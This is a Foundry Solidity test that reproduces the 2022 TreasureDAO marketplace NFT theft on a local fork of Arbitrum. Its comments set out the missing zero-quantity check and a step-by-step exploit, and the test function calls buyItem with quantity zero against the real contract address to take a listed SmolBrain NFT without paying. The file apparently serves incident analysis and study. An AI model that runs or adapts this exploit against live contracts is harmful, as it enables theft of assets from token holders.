// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

contract ContractTest is Test {
    ITreasureMarketplaceBuyer itreasure = ITreasureMarketplaceBuyer(0x812cdA2181ed7c45a35a691E0C85E231D218E273);
    IERC721 iSmolBrain = IERC721(0x6325439389E0797Ab35752B4F43a14C004f22A9c);
    uint256 tokenId = 3557;
    address nftOwner;
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("http://127.0.0.1:8547", 7_322_694); //fork arbitrum at block 7322694
    }

    function testExploit() public {
        nftOwner = iSmolBrain.ownerOf(tokenId);
        emit log_named_address("Original NFT owner of SmolBrain:", nftOwner);

        // VULNERABILITY: Zero-quantity buy bypass (buyer router + marketplace core) -- 2022-03 TreasureDAO / MAGIC NFT theft
        //
        // ROOT CAUSE (precise):
        // Buyer (0x812c...): buyItem lacks any `require(_quantity > 0)` or `if(_quantity==0) revert`.
        //   (, price) = marketplace.listings(...); require(price == _pricePerItem);
        //   totalPrice = _pricePerItem * _quantity;   // 0
        //   safeTransferFrom(msg.sender, this, 0); safeApprove(mkt, 0);
        //   marketplace.buyItem(nft, tid, owner, 0);
        //   then (because ERC721) this.safeTransferFrom(this, msg.sender, tid);
        //
        // Marketplace (called as _msgSender=the buyer contract):
        //   isListed: stored.quantity > 0   (true for normal listings)
        //   validListing: ERC721 ownerOf==_owner && not expired   (no _quantity check)
        //   require(sender != owner);
        //   require(listed.quantity >= _quantity)  // 1 >= 0
        //   if(ERC721) safeTransferFrom(owner, buyer, tid);   // quantity param unused
        //   if (listed.quantity == _quantity) delete else listed.quantity -= _qty;  // 1==0 => -=0, listing lingers
        //   _buyItem(price, 0): total=price*0=0; transfer 0 fee + 0 to seller
        //
        // CODE REFERENCES (in sources/ copies):
        //   buyer: L33 (lookup), L43 (mul), L44-45 (0 xfer/approve), L47 (call), L49 (ERC721 branch forward)
        //   mkt: L80 (isListed), L100 (valid for 721), L240 (>=), L244 (xfer ignore qty), L249 (cleanup), L273 (_buy mul)
        //
        // WHY THIS WAS POSSIBLE:
        // - The quantity field was added for ERC1155 support. ERC721 listings conventionally use quantity=1.
        // - createListing enforces >0 (mkt L134), but buyItem and its callers never did.
        // - Buyer was a public, unauthenticated convenience contract; anyone could call it with any _quantity.
        // - No reentrancy or other guard interacted; the 0-approve + 0-transferFrom is legal in ERC20.
        // - The per-owner listing key (listings[nft][tid][owner]) required the attacker to snapshot ownerOf before the call.
        //
        // IMPACT:
        // - Direct theft of any listed ERC721 (SmolBrain, etc.) for 0 MAGIC.
        // - Seller receives 0 compensation, loses the token.
        // - Marketplace state left inconsistent (listing still recorded under previous owner who no longer holds the token).
        // - Oracle receives a "sale" report at the unit price with implicit qty=0.
        // - No funds at risk on the payment token side because 0 moves.
        //
        // EXPLOIT STEPS:
        // 1. (testExploit:19) nftOwner = iSmolBrain.ownerOf(tokenId);   // capture the listing's owner key (required because mapping uses seller address)
        // 2. (testExploit:38) itreasure.buyItem(0x6325..., 3557, nftOwner, 0, 6969e18);
        // 3. buyer executes: listings read, price check passes (attacker echoed the correct listed price), total=0.
        // 4. 0-value ERC20 ops + delegate buyItem(...,0) -- buyer contract becomes the intermediate _msgSender().
        // 5. marketplace modifiers + >=0 + require(!self-buy) pass; ERC721.safeTransferFrom(seller -> buyer, 3557) succeeds.
        // 6. 1==0 false => quantity remains 1; _buyItem sends 0/0.
        // 7. buyer: ERC721.safeTransferFrom(buyer -> test contract, 3557)
        // 8. test's onERC721Received returns selector; ownership now attacker-controlled.
        // 9. log shows new owner.
        itreasure.buyItem(0x6325439389E0797Ab35752B4F43a14C004f22A9c, 3557, nftOwner, 0, 6_969_000_000_000_000_000_000);

        emit log_named_address("Exploit completed, NFT owner of SmolBrain:", iSmolBrain.ownerOf(tokenId));
    }

    function onERC721Received(address, address, uint256, bytes memory) public virtual returns (bytes4) {
        // Required because buyer does safeTransferFrom to msg.sender (the test) after receiving from marketplace.
        // Without this, the final hop would revert (ERC721 safe transfer requires receiver to implement the interface).
        return this.onERC721Received.selector;
    }
}
